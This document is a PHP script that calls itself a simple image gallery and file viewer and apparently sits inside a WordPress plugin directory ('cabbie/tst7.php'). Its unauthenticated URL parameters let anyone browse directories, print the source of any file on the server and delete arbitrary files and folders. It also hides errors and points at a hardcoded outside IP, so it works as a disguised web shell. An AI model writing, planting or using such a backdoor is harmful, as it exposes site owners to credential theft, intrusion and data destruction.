<?php 

ob_start(); 
session_start(); 

/* ~~~~~~~~~~~~~~ Changelog ~~~~~~~~~~~~~~~~~ 

# 29-11-2006 

* PHP Version Support fixed 
    - This now looks at the version 
     
# 27-11-2006 

* Script written 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/ 

/* ~~~~~~~~ Directory Settings ~~~~~~~~ */ 

$_GET['dir'] = str_replace("[and]", "&", $_GET['dir']); 

$dir = "http://151.10.1.2/".$_GET['dir']; 

// Stylesheet Settings // 

echo "<style type=\"text/css\"> 
    body    {font-family: arial; font-size: 12px} 
    h1        {font-size: 18px; text-align: center;} 
    a        {color: #6633cc; text-decoration: none;} 
</style>"; 

# Load up config # 

include_once("fileconf.php"); 
$conf = new conf; 
$conf->conf(); 
if(empty($_SESSION) || $_GET['opt'] == "resetall"){ 

/* ~~~~~~~~ Settings You Need To Change ~~~~~~~~ */ 

// General Settings // 

$conf->defset("pglim", 2);     # Change this number to however many pics you want per page 
$conf->defset("links", 0);     # Change To 1 to just see links instead otherwise leave as 0 to see the pics and set to 2 the see the links with the pics 
$conf->defset("title", "File Viewer"); # Specify Your Title Here 

// Image Sizeing // 

$conf->defset("width", 0);     # Change to specify a value otherwise leave as 0 to see full size 
$conf->defset("height", 135);     # Change to specify a value otherwise leave as 0 to see full size 

// Page Numbering // 

$conf->defset("top", 1);        # Change this to 1 to turn on 0 for off 
$conf->defset("bottom", 1);    # Change this to 1 to turn on 0 for off 

// Table Settings // 

$conf->defset("table", 1);     # Set to 1 to have a table otherwise leave as 0 
$conf->defset("cols", 3);        # Define the amount of cols you want 
$conf->defset("rows", 4);        # Define the amount of rows you want 

// Default Directory // 

$dd = str_replace("/wp-content/plugins/cabbie/tst7.php","/",realpath(__FILE__)); 
echo $dd; 

$conf->defset("dir", $dd);    # Put the root directory here 



/* ~~~~~~~~ Simple Gallery Script ~~~~~~~~ */ 

     
    # Sort out sessions # 
     
    $_SESSION['dir'] = $conf->out(dir); 
    $_SESSION['pglim'] = $conf->out(pglim); 
    $_SESSION['links'] = $conf->out(links); 
    $_SESSION['width'] = $conf->out(width); 
    $_SESSION['height'] = $conf->out(height); 
    $_SESSION['top'] = $conf->out(top); 
    $_SESSION['bottom'] = $conf->out(bottom); 
    $_SESSION['table'] = $conf->out(table); 
    $_SESSION['cols'] = $conf->out(cols); 
    $_SESSION['rows'] = $conf->out(rows); 
    $_SESSION['title'] = $conf->out(title); 
     
    # Store Defaults # 
     
    $_SESSION['defdir'] = $conf->out(defdir); 
    $_SESSION['defpglim'] = $conf->out(defpglim); 
    $_SESSION['deflinks'] = $conf->out(deflinks); 
    $_SESSION['defwidth'] = $conf->out(defwidth); 
    $_SESSION['defheight'] = $conf->out(defheight); 
    $_SESSION['deftop'] = $conf->out(deftop); 
    $_SESSION['defbottom'] = $conf->out(defbottom); 
    $_SESSION['deftable'] = $conf->out(deftable); 
    $_SESSION['defcols'] = $conf->out(defcols); 
    $_SESSION['defrows'] = $conf->out(defrows); 
    $_SESSION['deftitle'] = $conf->out(deftitle); 
} 

# Set vars # 
#$dir = $conf->out("dir"); 
$pglim = $conf->out("pglim"); 
$links = $conf->out("links"); 
$width = $conf->out("width"); 
$top = $conf->out("top"); 
$bottom = $conf->out("bottom"); 
$table = $conf->out("table"); 
$cols = $conf->out("cols"); 
$rows = $conf->out("rows"); 
$height = $conf->out("height"); 
$title = $conf->out("title"); 

# construct $dir # 
#$dir .= $_GET['dir']; 
$linkin = "/".$_GET['dir']; 

# Load Up Script # 

switch($_GET['show']){ 

case 'config': 

    switch($_GET['opt']){ 
         
        case 'resetall': 
                 
            echo "<div align=\"center\">All Settings Reset<br /></div>"; 
             
            $_SESSION['dir'] = $conf->out(defdir); 
            $_SESSION['pglim'] = $conf->out(defpglim); 
            $_SESSION['links'] = $conf->out(deflinks); 
            $_SESSION['width'] = $conf->out(defwidth); 
            $_SESSION['height'] = $conf->out(defheight); 
            $_SESSION['top'] = $conf->out(deftop); 
            $_SESSION['bottom'] = $conf->out(defbottom); 
            $_SESSION['table'] = $conf->out(deftable); 
            $_SESSION['cols'] = $conf->out(defcols); 
            $_SESSION['rows'] = $conf->out(defrows); 
            $_SESSION['title'] = $conf->out(deftitle); 
         
        default: 
         
            echo " 
            <div align=\"center\"> 
            $_SESSION[msg]<br />         
            <a href=\"?show=config&opt=dir\">Change Dir</a><br /> 
            <a href=\"?show=config&opt=view&dir=$_GET[dir]\">Change Image Settings</a><br /> 
            <a href=\"?show=config&opt=resetall&dir=$_GET[dir]\">Reset All Settings</a><br /> 
            <a href=\"?dir=$_GET[dir]\">Return to menu</a> 
            </div> 
            "; 
             
            $_SESSION['msg']=""; 
         
        break; 
     
        case 'dir': 
            if(!empty($_POST)){ 
     
                $conf->set("dir", $_POST['dir']); 
                if(@scandir($dir)){ 
                    $_SESSION['msg'] = "<div align=\"center\">Dir changed to: ".$conf->out("dir")."<br /></div>"; 
                    $_SESSION['dir'] = $conf->out("dir"); 
                    header("location: ?show=config"); 
                } else { 
                    $_SESSION['msg'] = "<div align=\"center\">Folder Not Found!<br /><br />Reverting Back To Defaults</div>"; 
                    header("location: ?show=config"); 
                    $conf->reset("dir"); 
                    $_SESSION['dir'] = $conf->out("dir"); 
                } 
     
            } else {     
     
                echo "<div align=\"center\"><form action=\"?show=config&opt=dir\" method=\"post\"><input type=\"text\" value=\"$_SESSION[dir]\" name=\"dir\"><input type=\"submit\" value=\"Change Dir\"></form><br /></div>"; 
     
            } 
     
        break; 
         
        case 'view': 
            if(!empty($_POST)){ 
     
                $conf->set("height", $_POST['height']); 
                $conf->set("width", $_POST['width']); 
                $conf->set("rows", $_POST['rows']); 
                $conf->set("cols", $_POST['cols']); 
                $conf->set("links", $_POST['links']); 
                $conf->set("table", $_POST['table']); 
                $_SESSION['height'] = $conf->out("height"); 
                $_SESSION['width'] = $conf->out("width"); 
                $_SESSION['rows'] = $conf->out("rows"); 
                $_SESSION['cols'] = $conf->out("cols"); 
                $_SESSION['links'] = $conf->out("links"); 
                $_SESSION['table'] = $conf->out("table"); 
                $_SESSION['msg'] = "<div align=\"center\">Current Settings:<br><ul><li>width: ".$conf->out("width")."</li><li>height: ".$conf->out("height")."</li><li>cols: ".$conf->out("cols")."</li><li>rows: ".$conf->out("rows")."</li><li>table: ".$conf->out("table")."</li><li>links: ".$conf->out("links")."</li></ul><br /></div>"; 
                    header("location: ?show=config&dir=$_GET[dir]"); 
                     
            } else {     
     
                echo "<div align=\"center\"><form action=\"?show=config&opt=view&dir=$_GET[dir]\" method=\"post\"> 
                Height - <input type=\"text\" value=\"$_SESSION[height]\" name=\"height\"><br /> 
                Width - <input type=\"text\" value=\"$_SESSION[width]\" name=\"width\"><br /> 
                Rows - <input type=\"text\" value=\"$_SESSION[rows]\" name=\"rows\"><br /> 
                Cols - <input type=\"text\" value=\"$_SESSION[cols]\" name=\"cols\"><br /> 
                Links - <input type=\"text\" value=\"$_SESSION[links]\" name=\"links\"><br /> 
                Table - <input type=\"text\" value=\"$_SESSION[table]\" name=\"table\"><br /> 
                 
                <input type=\"submit\" value=\"Change Image Settings\"></form><br /></div>"; 
     
            } 
     
        break; 
         
    } 
     
break; 


default: 

# PHP Fix # 

$phpn = phpversion(); 
$phpn = explode('.', $phpn, 2); 

switch($phpn[0]){ 

case 4: 
case 3: 

$dh  = opendir($dir); 
while (false !== ($filename = readdir($dh))) { 
   $file[] = $filename; 
} 

break; 

default: 

$file = scandir($dir); 

break;} 

# Hide Any Errors # 

error_reporting(0); 

# Work out viewing mode # 

if ($table !=0){ 
    $pglim = $cols * $rows; 
} 

# Some Settings # 

$n=0; 
$ic=0; 
$ff=0; 
$fc=0; 
$phplim=0; 
$filefollim=0; 
$follim=0; 
$oc=0; 
$pc=0; 
$filelim=0; 
$max=0; 

# Grab Just The Images # 

#$fileex = array("zip", "wma", "avi", "tar", "gzip", "htm", "swf", "png", "mp3", "mp4", "rar", "exe", "flv", "pdf"); 

while($img = $file[$n]){ 
$ex = explode('.', $img); 
$idx = strtolower(end($ex)); 
#echo $file[$n] . " - <b>" . $idx . "</b><br />"; 
if($idx == "gif" || $idx == "jpg" || $idx =="jpeg" || $idx =="bmp"){ 
$pic[$ic] = $file[$n]; 
$max++; 
$ic++;} else { 
#echo $file[$n]." - ".$ex[1].", ".$ex[2]." - ".var_dump(is_numeric($ex[1]))."<br />"; 
if(empty($idx) || strtolower($file[$n]) == $idx || is_numeric(end($ex))){ 
if(!empty($idx)){ 
#echo $file[$n] ." - <b>" . stristr(strtolower($file[$n]),"_files")."</b><br />"; 
$type=stristr(strtolower($file[$n]),"_files"); 
if(!empty($type)){ 
$filefol[$ff] = $file[$n]; 
$filefollim++; 
$ff++;} else { 
$folder[$fc] = $file[$n]; 
$follim++; 
$fc++;}} 
}else{ 
if($idx == "php"){ 
$php[$pc] = $file[$n]; 
$phplim++; 
$pc++; 
}else{ 
if($file[$n] != "Thumbs.db"){ 
$other[$oc] = $file[$n]; 

$filelim++; 
$oc++; 
}}} 
} 

$n++; 
} 

$maxpg = $max/$pglim + 1; 

# Title # 

echo " 
<html> 
<head> 
<title>$title</title> 
</head> 
<body> 
<h1>$title</h1>"; 

# Config links # 

echo "<div align=\"center\"><a href=\"?show=config&dir=$_GET[dir]\">Show Config</a></div>"; 

# Top Page Numbers # 

if($top != 0){ 
echo "<div align=\"center\"><br />Goto Page: <a href=\"?dir=$_GET[dir]\">1</a>"; 
if($maxpg >= 1){ 
$num=2; 
while($num < $maxpg){ 
if(((($num-1)*$pglim)+1) == $_GET[img]){ echo "<b>"; } 
echo " | <a href=\"?img=".(($num-1)*$pglim+1)."&dir=$_GET[dir]\">$num</a>"; 
if(((($num-1)*$pglim)+1) == $_GET[img]){ echo "</b>"; } 
$num++;}} 
echo"</div><br /><br />";} 

# Format Img Size # 

$browser = $_SERVER['HTTP_USER_AGENT']; 
$browser = explode('/', $browser, 2); 

switch($browser[0]){ 

default: 

if($height == 0 and $width != 0){ 
echo "<style type=\"text/css\"> 
    img {height: inherit; width: $width;} 
</style>";} 

if($height != 0 and $width == 0){ 
echo "<style type=\"text/css\"> 
    img {height: $height; width: inherit;} 
</style>";} 

if($height != 0 and $width != 0){ 
echo "<style type=\"text/css\"> 
    img {height: $height; width: $width;} 
</style>";} 

break; 
} 

# Display Images # 

if(empty($_GET['img'])){$limit=1; }else{ $limit = $_GET['img'];} 
$n=$limit; 
if($table != 0){ 
    echo "<table border=\"0\" width=\"100%\"> 
        <tr><td align=\"center\">"; 
    $tcol=1; 
    $trow=1; 
} 
while($img = $pic[$n] AND $n<($limit + $pglim)){ 
$img=$pic[$n]; 
$imglink= str_replace("&", "[and]", $linkin); 
if($n <= ($limit + $pglim)){ 
if($links != 1){ 
    if($table != 0){ 
        echo "<a href=\"?show=img&img=".$imglink.$img."\" target=\"_newtab\"><img src=\"".$linkin.$img."\" border=\"0\"><br />";  
        if($links==2){ echo "$img<br />";} 
        echo "</a>"; 
        if($tcol == $cols){ 
            echo "</td></tr><tr><td align=\"center\">"; 
            $tcol = 1; $trow = $trow + 1; 
        }else{ 
            echo "</td><td align=\"center\">"; 
            $tcol = $tcol + 1; 
        }}else{ 
            echo "<a href=\"".$imglink.$img."\" target=\"_newtab\"><img src=\"".$linkin.$img."\" border=\"0\"><br />"; 
            if($links==2){ echo "$img<br />";} 
            echo "</a>"; 
        } 
    } 
if($links == 1){echo "<a href=\"".$linkin.$imglink."\">$img</a><br />";} 
} 
$n++; 
} 
if($table != 0){echo "</table>";} 

# Bottom Page Numbers # 

if($bottom != 0){ 
echo "<div align=\"center\"><br />Goto Page: <a href=\"?dir=$_GET[dir]\">1</a>"; 
if($maxpg >= 1){ 
$num=2; 
while($num < $maxpg){ 
if(((($num-1)*$pglim)+1) == $_GET[img]){ echo "<b>"; } 
echo " | <a href=\"?img=".(($num-1)*$pglim+1)."&dir=$_GET[dir]\">$num</a>"; 
if(((($num-1)*$pglim)+1) == $_GET[img]){ echo "</b>"; } 
$num++;}} 
echo"</div><br /><br />";} 

# Folders # 

if(!empty($_GET[dir])){ 

echo "<br /><br />Dirs:<br /><br />"; 

$dirgrab = explode("/", $_GET[dir]); 

$dg=0; 

echo "<a href=\"?\">Root</a> / "; 

while($foldir = $dirgrab[$dg]){ 

    $lsturi = $lsturi.$foldir."/"; 
    echo "<a href=\"?dir=$lsturi\">$foldir</a> / "; 
    $dg++; 

} 

} 

if(!empty($folder)){ 

echo "<br /><br />Folders:<br /><br />"; 

$n=0; 
$follim++; 

while($fol=$folder[$n] AND $n<($follim)){ 

    $follink= str_replace("&", "[and]", $fol); 
    echo "<a href=\"?dir=".$_GET['dir'].$follink."/\">$fol</a> | "; 
    $n++;} 

} 

if(!empty($filefol)){ 

if($_SESSION['ff']!=0){ 
echo "<br /><br />Saved Webpage Folders: (Hide)<br /><br />"; 

$n=0; 
$filefollim++; 

while($fol=$filefol[$n] AND $n<($filefollim)){ 

    $follink= str_replace("&", "[and]", $fol); 
    echo "<a href=\"?dir=".$_GET['dir'].$follink."/\">$fol</a> | "; 
    $n++;} 

} else { 

    echo "<br /><br />Saved Webpage Folders: (Show)"; 

}} 

echo $php; 

if(!empty($php)){ 

echo "<br /><br />Php Files:<br /><br />"; 

$n=0; 
$phplim++; 

while($phpv=$php[$n] AND $n<($phplim)){ 

    $phplink= str_replace("&", "[and]", $phpv); 
    echo "<a href=\"?show=php&file=".$_GET['dir'].$phplink."\" target=\"_newtab\">$phpv</a> | "; 
    $n++;} 

} 

if(!empty($other)){ 

echo "<br /><br />Other files:<br /><br />"; 

$n=0; 
$filelim++; 

while($file=$other[$n] AND $n<($filelim)){ 

    if($file != "Thumbs.db"){ 
    echo "<a href=\"?show=other&file=".$_GET['dir'].$file."\" target=\"_newtab\">$file</a> | ";} 
    $n++; 

} 
} 

echo "<body> 
</html>"; 

break; 

case 'img': 

$size = 0; 
$_GET['img'] = str_replace("[and]", "&", $_GET['img']); 
$imglink= str_replace("&", "[and]", $_GET['img']); 

if($_GET[size] != 1){ 

$img = getimagesize($_GET['img']); 
$x=$img[0]; 
$y=$img[1]; 

echo "<style type=\"text/css\"> 
    img {height: 100%; width: inherit;} 
</style>"; 
$size = 1; 
} 

echo "<center><a href=\"?show=img&size=$size&img=$imglink\"><img src=\"$_GET[img]\" border=\"0\"></a></center>"; 

break; 

case 'php': case 'other': 

$_GET['file'] = str_replace("[and]", "&", $_GET['file']); 

highlight_file($dir.$_GET['file']); 

break; 

case 'rmf': 

$_GET['file'] = str_replace("[and]", "&", $_GET['file']); 

unlink($dir.$_GET['file']); 
header("location: ?dir=".$_GET['file']); 

break; 

case 'rmd': 

rmdir($dir); 
header("location: ?dir=".$_GET['dir']); 

break; 

} 

ob_end_flush(); 

?>
